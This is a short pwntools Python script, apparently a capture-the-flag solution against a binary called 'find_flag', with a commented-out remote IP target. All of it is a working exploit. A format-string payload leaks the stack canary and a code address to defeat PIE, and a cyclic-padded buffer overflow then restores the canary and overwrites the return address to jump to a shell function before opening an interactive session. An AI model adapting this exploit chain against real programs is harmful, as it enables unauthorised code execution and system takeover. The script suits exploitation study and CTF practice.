from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])


io=process("./find_flag")
# io=remote("1.14.71.254",28571)

shell_offset=0x1228

# gdb.attach(io)
# pause()

io.recvuntil(b"? ")
payload=b"%17$paa%14$p"
# payload=b"%17$paa%16$p"
io.sendline(payload)

io.recvuntil(b", ")
canary=int(io.recv(18),16)
print("canary "+hex(canary))

io.recvuntil(b"aa")
base_addr=int(io.recv(14),16)-0x1140
shell_addr=base_addr+shell_offset
print("base "+hex(base_addr))

io.recvuntil(b"? ")
payload=cyclic(0x38)+p64(canary)+p64(0)+p64(shell_addr)
io.sendline(payload)
io.interactive()